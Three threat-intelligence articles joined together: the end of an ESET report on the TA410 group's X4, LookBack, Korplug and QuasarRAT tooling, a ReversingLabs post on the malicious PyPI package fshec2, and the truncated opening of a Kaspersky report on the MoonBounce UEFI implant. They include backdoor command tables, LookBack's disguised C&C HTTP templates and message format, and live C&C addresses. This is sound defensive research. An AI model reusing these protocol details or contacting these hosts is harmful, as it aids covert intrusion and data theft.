While most of these names are also present in version 5, this list is not a strict subset of the one v.5 uses.
This tends to support the proposition that versions 4 and 5 of FlowCloud are maintained in parallel. 
It also embeds a DLL version of the Pafish (aka Paranoid Fish) sandbox and analysis detection tool as one of its encrypted resources.
This library is loaded in memory and all of the anti-analysis/anti-sandboxing checks it implements are run. 
Interestingly, the driver installed is the same as the one for version 5.0.2.
Those used by version 5.0.3 provide identical functionality, but differ slightly. 
TA410 – LookingFrog LookingFrog uses two main malware families: X4 and LookBack.
We have seen both of them on machines belonging to the same victim. X4 X4 is a custom backdoor that is used as a first stage, before LookBack is deployed.
It is loaded by a VMProtect-ed loader, usually named PortableDeviceApi.dll or WptsExtensions.dll.
Unfortunately, we were not able to uncover any persistence method. 
The loader injects an orchestrator into memory in a svchost.exe process.
In turn, the orchestrator injects the network component into memory and communicates with it via a file located at C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\Log\rsa.txt.
Figure 18 shows a summary of the X4 components. 
Figure 18.
Summary of the X4 components The network component is shellcode.
It is encrypted using the AES algorithm and stored in the Windows registry.
Table 2 shows the three registry keys used by X4. 
Table 2.
Network shellcode registry keys Registry KeyDescription HKLM\SOFTWARE\Microsoft\DRM\X4KeyAES key. HKLM\SOFTWARE\Microsoft\DRM\PSKeyName of the process into which the shellcode will be injected (spoolsv.exe). HKLM\SOFTWARE\Microsoft\DRM\X4DataEncrypted shellcode. 
The decrypted shellcode looks like it was based on Metasploit and communicates with a hardcoded IP address via HTTP.
An interesting characteristic is that it uses the fake Host header onedrive.live.com. 
Every second, the orchestrator, which lives in memory only, reads the cleartext rsa.txt file to check whether there are new commands to execute.
The commands are received from the C&C server, via the network shellcode.
In the orchestrator, the commands are identified by a numerical identifier that is computed from the command name, as shown in Figure 19. Figure 19.
Custom hash function seen in X4 The orchestrator handles seven commands, detailed in Table 3.
Output of these commands is written to C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\Log\output.log. 
Table 3.
X4 backdoor commands IDNameDescription 0x3ECFF9B9D92osloadWrite new encrypted shellcode to HKLM\SOFTWARE\Microsoft\DRM\X4Data.
It can also modify X4Key and PSKey. 
0x3F5FAFC0EDDpskillKill a process by PID. 
0x3F5FB1E6015pslistList the running processes using CreateToolhelp32Snapshot and Process32Next. 
0x3B6C27610D1injectDecrypt and inject shellcode, from encrypted form on disk, into memory. 
0xDA83E71execExecute a given command line. 
0xE9478DCliveGet the PID of the process in which the orchestrator is running. 
0x6D6E70D40caclsModify the access controls of a given object using SetEntriesInAclA, SetNamedSecurityInfoA and BuildExplicitAccessWithName. 
X4 provides basic functionalities to control the machine remotely, but it lacks more advanced spying capabilities. 
LookBack The LookBack backdoor has previously been described by Proofpoint; we are therefore providing a quick summary and our analysis of the custom network protocol. 
Backdoor In all samples we observed, the LookBack loader is a legitimate version of libcurl.dll with the curl_share_init (ordinal #52) export modified to load the SodomNormal communications module.
This corroborates the observation by Proofpoint researchers.
This module is embedded in the library’s resource section and encrypted with an algorithm similar to RC4.
The encryption/decryption function, shown in Figure 20, always uses the same key. Figure 20.
Decompiled view of the function used to encrypt and decrypt the embedded module The SodomNormal component tries to read configuration information from a sodom.ini file.
This configuration file is encrypted using the just-described function and starts with the magic bytes 0xAF1324BC.
If this file is unavailable or invalid, a hardcoded default configuration is used. 
A unique victim ID is then generated from the victim’s CPUID, username, and IP address.
This is sent to the server along with the computer’s name and the configuration data.
The communications module then downloads the main backdoor module, named SodomMain, from the C&C server.
Unfortunately, we couldn’t obtain this module. 
Communication protocol LookBack can communicate over HTTP or via its “normal protocol”.
In either case, the data being transferred is the same. 
LookBack’s normal protocol uses raw TCP sockets and a custom message format described in Table 4.
This message is composed of eight header fields, followed by a body of variable length.
The message body is encrypted with the function previously described for the SodomNormal resource in the loader (Figure 20).
The encrypted data is then compressed with the deflate algorithm via the compress function of the statically linked zlib. 
Table 4.
LookBack message format FieldOffset (bytes)Note Magic bytes0x00The constant 0x48AB2EC2.
Messages that don’t start with this magic value are discarded. 
<Message dependent>0x04 Compressed body size0x08 Uncompressed body size0x0C Checksum0x10CRC32 of the message body. 
Message type0x14Integer value indicating the message’s content and the associated action to be performed. 
We have found code for over 50 message types.
There seems to be little to no overlap between the values used by the client and the server.
Table 5 presents the types we have analyzed in more depth. 
<Message dependent>0x18 <Message dependent>0x1C Message Body0x20The message body can be empty.
In this case, the checksum and length fields are set to 0x00. 
Table 5.
LookBack message types Message typeUsed byDescription 2ClientRegister with C&C server.
The body contains configuration and information about the victim host. 3ServerAcknowledgment for message type 2. 8ClientRequest to download the main backdoor component (SodomMain). 
9ServerReply to message type 8.
The message body contains the SodomMain file. 
36 and 38ClientTransfer file to server in message body. 
35 and 37ServerResponse to message 36 or 38. 
41ClientRequest file from server. 
42ServerTransfer file to client in message body (response to message 41) 
The HTTP protocol uses the message format detailed in the previous paragraph, but it adds a few extra steps to disguise its traffic as legitimate HTTP.
It uses a pair of hardcoded templates, one for client requests and another for server responses.
The fields required for HTTP, such as content length, address, and port number, are filled in with the correct values; useless data is used for the others. 
For client requests, the messages are encoded with a modified hexadecimal algorithm that uses the encoding alphabet a-p instead of the conventional 0-9a-f.
This provides some obfuscation and ensures that messages will not contain binary data or be obviously hex encoded, both of which could look suspicious in an application/x-www-form-urlencoded message.
The request’s body is composed of this encoded value prefixed with the hardcoded string id=1&op=report&status=. Client request and server response templates are shown in Figure 21 and Figure 22 respectively, with the template fields in angle brackets. 
POST <C&C address + port>/status.php?r=<epoch timestamp><random 16-bit int> HTTP/1.1Accept: text/html, application/xhtml+xml, */*Accept-Language: en-usUser-Agent: <return value of ObtainUserAgentString OR "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko">Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: <C&C url>Content-Length: <content length>
Connection: Keep-AliveCache-Control: no-cache id=1&op=report&status=<encoded LookBack message> Figure 21.
Template used for HTTP client requests On the server side, the data described in the previous section is sent directly as binary data in the body with a header purporting it is a GIF image. 
HTTP/1.1 200 OKServer: nginx/1.12.2Date: <current time> GMTLast-Modified: <current time - 100 seconds>
GMTETag:
<3 random 16-bit ints>Accept-Ranges: bytesContent-Length: <content length>Keep-Alive: timeout=5, max=100Connection: Keep-AliveContent-Type: image/gif <LookBack message> Figure 22.
Template used for HTTP server responses TA410 – JollyFrog This third team uses off-the-shelf malware from the known malware families QuasarRAT and Korplug (aka PlugX).
JollyFrog mostly aligns with what was described by Fortinet as APT10. Korplug Korplug, also known as PlugX, is a backdoor that has been used for years by many different cyberespionage groups.
Despite being well known, it is still in use and we have observed TA410 using it as recently as in April 2021. 
In the case of TA410, Korplug arrives as a RARSFX archive, generally named m.exe, containing three files: qrt.dll: A custom loader. 
qrtfix.exe: A legitimate signed application from F-Secure, vulnerable to DLL search-order hijacking. 
qrt.dll.usb:
The Korplug shellcode. 
The loader allocates memory using VirtualAlloc and copies the content of qrt.dll.usb there.
Then it jumps right into the shellcode that will decompress and load the Korplug payload. 
QuasarRAT QuasarRAT is a full-featured backdoor freely available on GitHub.
It is used by numerous threat actors who perform cyberespionage or cybercrime. 
TA410 uses a custom downloader and a custom loader written in .NET, which are convenient for identifying their instances of QuasarRAT among all the noise created by other attackers. 
Named sll.exe, this downloader is digitally signed with the certificate seen in Figure 23.
The certificate is likely stolen and belongs to 北京和赢讯时科技有限公司 (translated: Beijing Heyingxunshi Technology Co., Ltd.) with thumbprint 850821D88A4475F0310F10FBA806353A4113D252.
Although the certificate has now been revoked, it was still valid when this sample was signed on August 10th, 2020. 
Figure 23.
Digital signature of the QuasarRAT downloader This downloader simply downloads the loader and encrypted QuasarRAT payload from the hardcoded C&C server http://ffca.caibi379[.]com, at /rwjh/new/.
This server was previously linked to FlowCloud (FlowingFrog).
The loader is named PresentationCache.exe and is protected with DNGuard, a commercial .NET packer.
It is also signed with the same certificate as the downloader.
It decrypts and loads the final QuasarRAT payload, which uses cahe.microsofts[.]org as its C&C server. 
Conclusion TA410 is a cyberespionage umbrella targeting high-profile entities such as governments and universities worldwide.
ESET is revealing its latest findings about this group, including results from ongoing research, during Botconf 2022. 
Initial access to targets is obtained by exploiting vulnerable internet-facing applications such as Microsoft Exchange, or by sending spearphishing emails with malicious attachments such as RTF documents created via the Royal Road builder.
Even though the JollyFrog team uses generic tools, FlowingFrog and LookingFrog have access to complex implants such as FlowCloud and LookBack.
YARA and Snort rules for these implants are available in ESET’s GitHub repository. 
For any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com. 
ESET Research now also offers private APT intelligence reports and data feeds.
For any inquiries about this service, visit the ESET Threat Intelligence page. 
IoCs Files SHA-1FilenameDetectionDescription C96558312FBF5847351B0B6F724D7B3A31CCAF03N/AWin32/Agent.
UWRFlowCloud v5.0.3 initial loader. 
1403241C415A8D686B1148FA4229A2EB833D8D08setlangloc.dllWin32/Agent.
UNLFlowCloud DLL hijacking malicious library. 
38D0E92AFF991CFC9C68D7BAAD6CB85916139AF5hidmouse.sysWin32/Agent.
UKRTA410 32-bit Rootkit/Keylogger driver. 
AF978ED8AD37CE1437A6B42D96BF518D5C4CFD19hidmouse.sysWin64/Agent.
UKRTA410 64-bit Rootkit/Keylogger driver. 
B70F3A3A9B5B8506EE95791469CA496E01AD7DAFwinver32.dllWin32/Agent.
ULHFlowCloud v4.1.3 hcClientLoaderZero_x86 backdoor. 
014421BDB1EA105A6DF0C27FC114819FF3637704hhh.exeWin32/Agent.
ABYKFlowCloud v4.1.3 initial loader. 
EA298866E5A61FEEA4D062987F23B10A78C8A4CAN/AWin32/Agent.
ULHFlowCloud v4.1.3 backdoor. 
021B9E2E8AA30B29569254C0378A9F43E4F32EECwinver64.dllWin64/Agent.
KMFlowCloud v4.1.3 hcClientLoaderZero_x64 backdoor. 
2A2F08FAD6B0A86DC94885224687D954E739CC21N/AWin32/ParanoidFish.
APafish sandbox detection tool. 
3658B7CCA13C8C8AD03E9B6AEFE4B9CBE48E3C81hidmouse.sysWin64/Agent.
UKRTA410 Rootkit/Keylogger driver. 
517488F6BD0E7FC9EDE82F37226A75212B277E21hidmouse.sysWin64/Agent.
C05B4AD7A3322917E17710842FB88A090198D51FN/AWin32/Agent.TWILookBack trojanized libcurl loader. 
DB2DF1BDF8145CB8ABA3A2026A3CC3EF4F1762BEphx.dllWin32/Agent.TWILookBack trojanized libcurl loader. 
EDE2AB811311FC011B1E89C5A0B7A60C123B7398hidmouse.sysWin64/Agent.
7AA35BA7030AFCD271436DE8173D7B2F317A1BFClibcurl.dllWin32/Agent.TWILookBack trojanized libcurl loader. 
A5C02ABE698300F3DE0B7CC7F0856652753831DAlibcurl.dllWin32/Agent.TWILookBack trojanized libcurl loader. 
613C4AFAE8F5F80F22DCD1827E3230FCA361ADA5libcurl.dllWin32/Agent.
UKDLookBack trojanized libcurl loader. 
859CD6DFDADAB3D6427C6C1C29581CB2094D648Fmeterpreter.exeWin32/Rozena.
CPMetasploit Meterpreter backdoor. 
DBEA7F0C0D2BF8BC365A2D1572CA1538FE8FB9A3responsor.datWin32/Agent.
ULLFlowCloud fcClientDLL final stage backdoor. 
ADD5B4FD9AEA6A38B5A8941286BC9AA4FE23BD20絆邧坋蔡趕口昴.doc Win32/Exploit.
Agent.
TYMalicious Royal Road document. 
7BA42061568FF6D9CA5FE5360DCE74C25EA48ADAN/AWin32/Agent.
ACKQPacked Tendyron downloader. 
D81215890703C48B8EA07A1F50FEC1A6CA9DF88BN/AWin32/TrojanDownloader.
FLIUnpacked Tendyron downloader. 
F359D3C074135BBCA9A4C98A6B6544690EDAE93DOnKeyToken_KEB.dllWin32/Injector.
ELGATendyron malicious DLL. 
621B31D5778EC2FB72D38FB61CED110A6844D094N/AWin64/Rozena.
AOX4 network shellcode. 
BC11DC8D86A457A07CFE46B5F2EF6598B83C8A1Fm.exeWin32/Injector.
EMVAKorplug dropper. 
C369E1466F66744AA0E658588E7CF2C051EE842Fqrt.dllWin32/Injector.
EMVAKorplug loader. 
B868764C46BADC152667E9128375BA4F8D936559qrt.dll.usbN/AKorplug encrypted payload. 
BDECA89B4F39E6702CE6CBBC9E6D69F6BBAB01C8N/AN/AKorplug decrypted payload. 
5379FBB0E02694C524463FDF7F267A7361ECDD68sll.exeMSIL/TrojanDownloader.
GPSQuasarRAT downloader. 
6CC6170977327541F8185288BB9B1B81F56D3FD0PresentationCache.exeMSIL/Agent.
TZGQuasarRAT loader. 
D95185A4A3F8512D92F69D2ED7B8743638C54BE8N/AMSIL/Spy.
AESQuasarRAT backdoor. 
BE7F0E41CD514561AED43B07AA9F5F0842BF876CHTra.exeWin32/HackTool.
Hucline.
ABHUC Packet Transmitter (HTran). 
7F663F50E9D6376715AEB3AB66DEDE038258EF6CHTran13.exeWin32/HackTool.
SHUC Packet Transmitter (HTran). 
BEDA1224B3BB9F98F95FF7757D2687F4D9F4B53Aevent.exeWin32/Agent.
UJNSimple cmd.exe-based backdoor compiled with MingW. 2B61E7C63A0A33AAC4CF7FE0CEB462CF6DACC080htran.exeWin32/HackTool.Hucline.
EF3C796652141B8A68DCCF488159E96903479C29htran_f-secury.exeWin32/HackTool.
6B547C244A3086B5B6EA2B3A0D9594BBE54AE06Binbt.zipPython/HackTool.
JEXE masquerading as ZIP.
This is a Python network scanner (compiled with PyInstaller). 
4CDCE3AF614C2A5E60E71F1205812AB129C0955Bmsd017.exePython/Exploit.
MS17-010.BThis is a Python scanner (compiled with PyInstaller) for the vulnerability MS17-010 (EternalBlue). 
Certificates Serial number 0F8B600FF1882E Thumbprint02ED6A578C575C8D9C72398E790354B095BB07BC Subject CNHangzhou Leishite Laser Technology Co., Ltd. Subject OHangzhou Leishite Laser Technology Co., Ltd. Subject LHangzhou Subject SZhejiang Subject CCN Valid from2012-03-29 09:07:04 UTC Valid to2014-04-02 06:24:19 UTC Serial number 4ED8730F4E1B8558CD1CB0107B5F776B Thumbprint850821D88A4475F0310F10FBA806353A4113D252 Subject CN北京和 赢讯时 科技有限公司 (translation: Beijing Heyingxunshi Technology Co., Ltd.) Subject O北京和 赢讯时 科技有限公司 (translation: Beijing Heyingxunshi Technology Co., Ltd.) Subject OU研 发 部 ( R&D Department) Subject S北京市 (Beijing) 
Subject CCN Valid from2019-11-13 00:00:00 UTC Valid to2020-11-12 23:59:59 UTC Network DomainIPFirst seenDetails 43.254.216[.]1042020-06Delivery server 45.124.115[.]1032020-08Delivery server 161.82.181[.]42020-12Delivery server 43.254.219[.]1532020-07X4 C&C server 154.223.141[.]362020-06HTran C&C server 103.139.2[.]932020-10Tendyron C&C server cahe.microsofts[.]comQuasarRAT C&C server ffca.caibi379[.]comQuasarRAT downloader C&C server smtp.nsfwgo[.]comKorplug C&C server 45.124.115[.]1032020-06LookBack C&C server 185.225.19[.]172021-01LookBack C&C server 94.158.245[.]2492020-03LookBack C&C server 5.252.179[.]2272021-03LookBack C&C server 222.186.151[.]1412019-11FlowCloud C&C server 47.111.22[.]652020-09FlowCross C&C server 114.55.109[.]1992020-05FlowCloud C&C server dlaxpcmghd[.]com185.225.17[.]392020-09LookBack C&C server wwww.dlmum[.]comN/AFlowCloud C&C server MITRE ATT&CK techniques This table was built using version 9 of the MITRE ATT&CK framework. 
TacticIDNameDescription Resource DevelopmentT1587.001Develop Capabilities: MalwareTA410 develops LookBack and FlowCloud. 
T1588.003Obtain Capabilities: Code Signing CertificatesTA410 uses stolen code-signing certificates. 
T1588.005Obtain Capabilities: ExploitsTA410 had exploits for ProxyLogon and ProxyShell. 
Initial AccessT1190Exploit Public-Facing ApplicationTA410 has exploited web server vulnerabilities for initial access. 
T1566.001Phishing: Spearphishing AttachmentTA410 uses malicious RTF and DOCX attachments to compromise victims. 
ExecutionT1106Native APIFlowCloud makes extensive use of the Windows API to execute commands and launch processes. 
T1129Shared ModulesTA410’s backdoors can load DLLs and execute their payloads. 
T1203Exploitation for Client ExecutionTA410 uses Royal Road RTF documents to compromise victims. 
T1559.001Inter-Process Communication: Component Object ModelFlowCloud uses COM interfaces to schedule tasks and perform WMI queries. 
T1047Windows Management InstrumentationTA410 uses WMI for lateral movement and information gathering. 
PersistenceT1053.005Scheduled Task/Job: Scheduled TaskFlowCloud creates a scheduled task for persistence. 
T1505.003Server Software Component: Web ShellTA410 plants webshells on vulnerable web servers. 
T1543.003Create or Modify System Process:
Windows ServiceFlowCloud can be configured to create a service for persistence. 
Defense EvasionT1027Obfuscated Files or InformationFlowCloud files are distributed and stored in encrypted form. 
T1036.004Masquerading: Masquerade Task or ServiceThe driver component of FlowCloud masquerades as a mouse driver service. 
T1036.005Masquerading:
Match Legitimate Name or LocationFiles named after legitimate utilities are written into the %ProgramFiles%\MSBuild\Microsoft\Expression\Blend\msole\ subdirectory. 
T1014RootkitFlowCloud uses a rootkit to hide its network traffic and processes from system utilities. 
T1055.001Process Injection: Dynamic-link Library InjectionFlowCloud uses both regular and reflective DLL injection.
It also manually loads some DLLs, bypassing calls to LoadLibrary. 
T1055Process InjectionTA410’s backdoors perform process injection to masquerade as harmless processes. 
T1055.003Process Injection: Thread Execution HijackingOne of FlowCloud’s DLLs replaces instructions in the loading process to make it execute code written in its memory. 
T1055.012Process Injection: Process HollowingFlowCloud uses module stomping to hide the loading of its main backdoor. 
T1140Deobfuscate/Decode Files or InformationMultiple TA410 backdoors communicate with their C&C through encrypted and obfuscated channels. 
T1574.002Hijack Execution Flow: DLL Side-LoadingFlowCloud uses DLL Side-Loading to launch its second-stage dropper. 
T1497Virtualization/Sandbox EvasionSome versions of FlowCloud use the Pafish utility to detect virtualization, sandboxes, and debuggers. 
T1134.002Access Token Manipulation: Create Process with TokenFlowCloud can create processes using tokens acquired from legitimate processes. 
T1070.004Indicator Removal on Host: File DeletionFlowCloud deletes its rootkit’s executable after launching it. 
T1070.006Indicator Removal on Host: TimestompFlowCloud backdates some files and services to 2013. 
DiscoveryT1010Application Window DiscoveryWhen logging mouse events, FlowCloud gathers information about the application running in the foreground. 
T1057Process
DiscoveryMultiple TA410 backdoors can list running processes. 
T1518Software DiscoveryFlowCloud uses the IShellAppManager COM object to list installed software. 
T1083File and Directory DiscoveryFlowCloud can search through connected file systems and obtain directory listings. 
T1120Peripheral Device DiscoveryFlowCloud can list connected camera devices. 
T1016System Network Configuration DiscoveryFlowCloud can discover and use locally configured proxies. 
T1012Query RegistryFlowCloud components use registry keys to signal each other. 
T1115Clipboard DataFlowCloud registers a listener to steal clipboard data when it is changed. 
CollectionT1056Input CaptureFlowCloud logs mouse clicks. 
T1056.001Input Capture: KeyloggingFlowCloud records keystrokes. 
T1113Screen
CaptureFlowCloud takes screenshots at regular intervals. 
T1125Video CaptureFlowCloud uses OpenCV to take pictures using connected camera devices. 
T1123Audio CaptureFlowCloud has audio capture functionality. 
T1119 Automated CollectionFlowCloud automatically collects data based on timers and events. 
T1074.001Data Staged: Local Data StagingFlowCloud stores collected data in local SQLite databases prior to exfiltration. 
T1005Data from Local SystemFlowCloud can exfiltrate files from local file systems. 
T1025Data from Removable MediaFlowCloud can exfiltrate files from removable drives. 
T1560.002Archive Collected Data: Archive via LibraryFlowCloud and LookBack use a statically linked zlib library to compress data. 
T1560.003Archive Collected Data: Archive via Custom MethodFlowCloud compresses some collected data by removing duplicates and similar screen captures. 
Command And ControlT1071.001Application Layer Protocol: Web ProtocolsLookBack and FlowCloud can send and receive data over HTTP. 
T1095Non-Application Layer ProtocolLookBack can communicate over raw TCP sockets. 
T1132.001Data Encoding: Standard EncodingFlowCloud uses Protobuf to encode C&C commands and configuration. 
T1132.002Data Encoding: Non-Standard EncodingLookBack encodes binary data using a custom hex-encoding method. T1573.001Encrypted Channel:
Symmetric CryptographyFlowCloud can use XOR, TEA, RC4 and a modified AES algorithm to encrypt traffic and files. 
ExfiltrationT1030Data Transfer Size LimitsFlowCloud uses local caches to stage data and exfiltrates their content when it reaches a size specified in its configuration. 
ImpactT1529System Shutdown/RebootFlowCloud can force a system crash or shutdown. 
27 Apr 2022 - 03:00PM 
title: When byte code bites: Who checks the contents of compiled Python files? url: https://securityboulevard.com/2023/06/when-byte-code-bites-who-checks-the-contents-of-compiled-python-files/ During our continuous threat hunting efforts to find malware in open-source repositories, the ReversingLabs team encountered a novel attack that used compiled Python code to evade detection.
It may be the first supply chain attack to take advantage of the fact that Python byte code (PYC) files can be directly executed, and it comes amid a spike in malicious submissions to the Python Package Index (PyPI).
If so, it poses yet another supply chain risk going forward, since this type of attack is likely to be missed by most security tools, which only scan Python source code (PY) files. 
We reported the discovered package, named fshec2, to the PyPI security team on April 17, 2023, and it was removed from the PyPI repository the same day.
The PyPI security team has also recognized this type of attack as interesting and acknowledged that it had not been previously seen. 
Here’s how my threat research team identified the fshec2 as a suspicious package and the novel method that the attackers employed as they attempted to avoid detection.
I’ll also tell you what our researchers found when investigating the command-and-control (C2) infrastructure used by the malware — and provide evidence of successful attacks. 
Detection:
Unusual behaviors ReversingLabs regularly scans open-source registers such as PyPi, npm, RubyGems, and GitHub looking for suspicious files.
As the team observed before, these often jump out at us from the millions of legitimate, nonmalicious files hosted on these platforms because they exhibit strange qualities or behaviors that, experience tells us, often signal malicious intent. 
That was the case with fshec2.
The package initially caught our attention following a scan using the ReversingLabs Software Supply Chain Security platform, which extracted a suspicious combination of behaviors from an fshec2 compiled binary.
Those suspicious behaviors extracted from the decompiled file included the presence of URLs that reference the host by IP address, as well as the creation of a process and execution of a file. 
A manual review of the fshec2 package followed.
It revealed that it contains only three files.
The code inside two of those Python source code files, _init_.py and main.py, appeared benign.
It was only upon inspection of a decompiled version of the third file, full.pyc, that more interesting behaviors came to light and the true nature of the package emerged. 
Figure 1: Files containing package functionality Unmasking an unusual loader Threat actors are always trying to evade detection from security solutions.
Obfuscation is one of the most popular methods to achieve this.
For example, several of our previous research blogs have explored incidents in the npm landscape in which JavaScript obfuscation was used.
That includes the Material Tailwind and IconBurst campaigns, as well as the more recent campaign we identified distributing Havoc malware. 
Historically, npm has been the unfortunate leader and PyPI an also-ran in the race to see which open-source platform attracts the most attention from malware authors.
In the last six months, however, ReversingLabs and others have observed a marked increase in the volume of malware published to PyPI.
In fact, in May, the creation of new user accounts and projects on PyPI were temporarily suspended for a few hours due to a high volume of malicious activity. 
Along with the increase in malicious modules, my team has observed an increase in the use of various obfuscation techniques in malware published to the PyPI repository.
One of the most popular obfuscation techniques is execution of Base64-encoded malicious code, which was first observed in campaigns related to W4SP authors in November 2022.
Variations of that attack, in which malicious code is embedded in code but shifted past the edge of default screen borders (thereby hiding it from view), are still seen in the wild.
Today, however, attackers have more tools at their disposal.
For example, use of W4SP crew obfuscation tools such as Hyperion and Kramer is on the rise — likely a response to the improving detection capabilities of security companies monitoring PyPI and other public package repositories. 
The fshec2 package uses a significantly different approach that doesn’t rely on obfuscation tools.
It instead places the malicious functionality into a single file containing compiled Python byte code. 
How Python attacks (usually) work Before I get to the new obfuscation method my team discovered, here’s a look at how malicious attacks using Python typically work. 
There are three types of Python files that may play a role in a malicious campaign: plaintext Python files, which have a /oy extension; compiled Python files, which have a .pyc extension; and Python files that have been compiled into native executables using tools such as py2exe and PyInstaller. 
In most of the malicious campaigns that my team has observed leveraging PyPI packages, the executables are not present in the malicious package but are downloaded and run by the plaintext PY files from external infrastructure. 
But fshec2 is different.
Here, we observed a compiled Python file (full.pyc) present inside the PyPI package that contained malicious functionality.
The entry point of the package was found in the __init__.py file, which imports a function from the other plaintext file, main.py, which contains Python source code responsible for loading of the Python compiled module located in one of the other files, full.pyc. 
This innocent-seeming import of a function triggers a previously unseen loading technique inside the main.py file that avoids using the usual import directive, which is the simplest way to load a Python compiled module (and also something that is likely to get noticed.)
Instead, Importlib, the implementation of import in Python source code portable to any Python interpreter, is used to avoid detection by security tools.
(Some explanation: Importlib is typically used in cases where the imported library is dynamically modified upon import.
However, the library loaded by main.py was unchanged, meaning that the regular import function would have sufficed.
This tends to support the theory that Importlib is used to avoid detection.) 
Figure 2: Loading of the compiled Python module from main.py After the module is loaded, its get_path method is invoked
(see Figure 3).
Using ReversingLabs Software Supply Chain Security, my team was able to detect and extract this code from the decompiled PYC file.
The get_path method, which isn’t found (in readable form) anywhere inside the original fshec2 package, performs some of the common malicious functions observed in other malicious PyPI packages we have analyzed.
Among other things, it collects usernames, hostnames, and directory listings.
It also fetches commands that are set for execution using scheduled tasks or cronjob, depending on the host platform. 
Figure 3: The decompiled code extracted from the full.pyc compiled byte code file showing the content of the get_path() method. 
The fetched commands are just another Python script, which is intended to change (see Figure 4).
In fact, while I have been writing this blog, my team observed it download and execute yet another Python script from the cron_script located on the same host.
The cron_script contained functionality almost identical to the script found in full.pyc, the compiled Python module shipped with the PyPI package. 
In this way, the fshec2 attack is engineered to be able to evolve.
The full.pyc file contains functionality to download commands from a remote server identified in the commands path on the C2 server.
The downloaded commands are a Python file almost identical to full.pyc but with the location for downloading stage 2 commands placed in a cron_script, which periodically downloads new commands.
This allows the attackers to change the content served at the commands location to make the malware serve new commands. 
Figure 4: Code responsible for downloading cron_script file A misconfigured web host gives up the goods Given the malware’s reliance on remote C2 infrastructure, it made sense to scout out the web host used in the attack to get more information about the malware’s capabilities.
As it turned out, the web host had plenty to tell us! 
Like regular developers, malware authors often make configuration mistakes when setting up infrastructure.
Such mistakes can reveal interesting information about the inner workings of malicious software.
That was the case with the web host that was set up to communicate with compromised systems.
For example, trying to access an invalid page on the web host did not generate a 404 “page not found” error, as you would expect.
Instead, visitors were served a page from a Django application listing a variety of commands (see Figure 5). 
Figure 5: Uncovered web locations Fortunately for us, the Django application was configured in debug mode, with error descriptions that gave us a detailed list of reachable host paths.
Some of those we had already seen in the downloaded scripts used in the attack, but there were new paths that we had not seen, including: admin, uploaded_files, and download. 
Unfortunately, the trail went cold there, because all three of them require authorization to execute page functionality. 
Figure 6: Password-protected file download form Still, some information was exposed by this oversight, even without knowing the password.
For example, command No. 7 in Figure 5 provides a way to download files by their ID using the command: download/<int:file_id>, where file_id is an integer and the files in question are numbered in sequential order, starting from 1.
As seen in Figure 6, the filename is also leaked without requiring authorization. 
The sheer number of these mistakes might lead us to the conclusion that this attack was not the work of a state-sponsored actor and not an advanced persistent threat (APT). 
While my team didn’t collect enough evidence to prove that assumption one way or another, harvesting the filenames by incrementing file ID let us determine that the attack was successful in some cases.
Our researchers still can’t say who or what the targets were.
However, we can confirm that developers did install the malicious PyPI package and that their machine names, usernames, and directory listings were harvested as a result. 
Using the method described above, our researchers downloaded files with ID Nos. 1-18.
The resulting filenames show that at least two targets were infected with username and hostname combinations desktop__desktop-7G-Series and Txxxx_Axxxx__LAPTOP-UH9S5HF2 (identifying information removed). 
Some of the filenames suggest that additional malware commands include keylogging functionality. 
Finally, my team can’t exclude the possibility that there were other channels of distribution besides the fshec2 PyPI package that we haven’t encountered. Figure 7: Names of the files that can be downloaded Conclusion Even though this malicious package and the corresponding C2 infrastructure weren’t state of the art, they remind us how easy it is for malware authors to avoid detection based on source-code analysis. 
Loader scripts such as those discovered in the fshec2 package contain a minimal amount of Python code and perform a simple action: loading of a compiled Python module.
It just happens to be a malicious module.
Inspector, the default tool provided by the PyPI security team to analyze PyPI packages, doesn’t, at the moment, provide any way of analyzing binary files to spot malicious behaviors.
Compiled code from the .pyc file needed to be decompiled in order to analyze its content.
Once that was accomplished, the suspicious and malicious functionality was easy to see. 
Figure 8: Inspector tool provided by PyPI security team 
The discovery of malicious code in the fshec2 package underscores why the ability to detect malicious functions such as get_path is becoming more important for both security and DevSecOps teams.
Most application security solutions either do not focus on supply chain security or only perform source-code analysis as part of the package security inspection.
That is why malware hidden inside the Python compiled byte code could slip under the radar of the traditional security solutions. 
ReversingLabs Software Supply Chain Security supports static analysis and unpacking for a wide range of binary file formats, including the kind of compiled Python byte code seen in this attack.
As seen with fshec2, analyzing this kind of file allows defenders to extract indicators of malicious intent, making security assessment much easier. 
Figure 9: Behavior indicators and networking strings extracted from the decompiled PYC file using ReversingLabs Software Supply Chain Security. 
This includes detection of process creation, file execution, gathering of sensitive information, presence of IP addresses, and much more.
Simple scanning of source code from open-source packages will miss this type of threat.
And, as the attackers press their advantage and become more sophisticated, even more advanced tools will be needed to make sure your developed code and software development infrastructure remains protected. 
Indicators of Compromise (IoCs) Package name Version SHA1 fshec2 1.0.0 7be50d49efd1e8199decf84dc4623f58b8686161bab57a9aac8e138e4e2a9f8079fd50b7c1d31540 C2 server: 13.51.44.246 **
*
This is a Security Bloggers Network syndicated blog from ReversingLabs Blog authored by Karlo Zanki.
Read the original post at: https://www.reversinglabs.com/blog/when-python-bytecode-bites-back-who-checks-the-contents-of-compiled-python-files 
title: MoonBounce: the dark side of UEFI firmware url: https://securelist.com/moonbounce-the-dark-side-of-uefi-firmware/105468/ What happened? 
At the end of 2021, we were made aware of a UEFI firmware-level compromise through logs from our Firmware Scanner, which has been integrated into Kaspersky products since the beginning of 2019.
Further analysis has shown that a single component within the inspected firmware’s image was modified by attackers in a way that allowed them to intercept the original execution flow of the machine’s boot sequence and introduce a sophisticated infection chain. 
By examining the components of the rogue firmware and other malicious artefacts from the target’s network, we were able to reach the following conclusions: 
